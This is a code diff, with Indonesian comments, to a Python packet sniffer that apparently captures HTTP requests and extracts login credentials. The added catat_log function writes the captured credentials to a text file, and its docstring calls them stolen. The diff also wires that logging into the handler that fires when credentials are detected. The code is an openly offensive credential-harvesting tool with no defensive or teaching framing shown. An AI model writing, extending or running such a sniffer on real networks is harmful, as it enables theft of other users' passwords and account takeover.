@@ -35,20 +35,29 @@ def dapatkan_info_login(paket):
             
     return None
 
+def catat_log(url, data):
+    """Fungsi untuk menyimpan hasil curian ke file teks."""
+    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    log_entry = f"[{waktu}] URL: {url} | DATA: {data}\n"
+    
+    with open("hasil_tangkapan.txt", "a") as f:
+        f.write(log_entry)
+    print(Fore.YELLOW + f"[Disk] Data berhasil disimpan ke 'hasil_tangkapan.txt'")
+
 def proses_paket(paket):
     if paket.haslayer(http.HTTPRequest):
-        
         url = dapatkan_url(paket)
-        print(Fore.BLUE + f"[+] Mengunjungi >> {url}")
 
         info_login = dapatkan_info_login(paket)
         
         if info_login:
             print(Fore.RED + Style.BRIGHT + "\n" + "="*60)
-            print(Fore.RED + Style.BRIGHT + "[*] BAHAYA: KREDENSIAL/PASSWORD DITEMUKAN!")
+            print(Fore.RED + Style.BRIGHT + "[*] BAHAYA: KREDENSIAL DITEMUKAN!")
             print(Fore.YELLOW + f"    Target URL : {url}")
             print(Fore.GREEN +  f"    Data Bocor : {info_login}")
             print(Fore.RED + Style.BRIGHT + "="*60 + "\n")
+            
+            catat_log(url, info_login)
 
 def mulai_mengintai(interface):
     print(Fore.CYAN + f"[*] Menjalankan 'Jaring Pengintai' pada interface: {interface}")
